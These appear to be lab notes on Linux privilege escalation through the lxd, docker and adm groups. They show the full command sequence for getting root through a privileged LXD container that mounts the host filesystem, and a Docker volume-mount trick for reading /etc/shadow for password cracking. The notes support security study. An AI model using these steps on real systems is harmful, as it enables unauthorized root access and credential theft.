## LXC / LXD

```shell
devops@NIX02:~$ id 

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell
devops@NIX02:~$ unzip alpine.zip
```

```shell
devops@NIX02:~$ lxd init 
Do you want to configure a new storage pool (yes/no) [default=yes]? yes 
Name of the storage backend to use (dir or zfs) [default=dir]: dir 
Would you like LXD to be available over the network (yes/no) [default=no]? no 
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes 

/usr/sbin/dpkg-reconfigure must be run as root error: Failed to configure the bridge
```

```shell
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true 

Creating r00t
```

```shell
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true 

Device mydev added to r00t
```

```shell
devops@NIX02:~$ lxc start r00t 
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh 

~ # id 
uid=0(root) gid=0(root) 
~ #
```
## Docker

Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`.
This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.
## ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```shell
secaudit@NIX02:~$ id 

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```
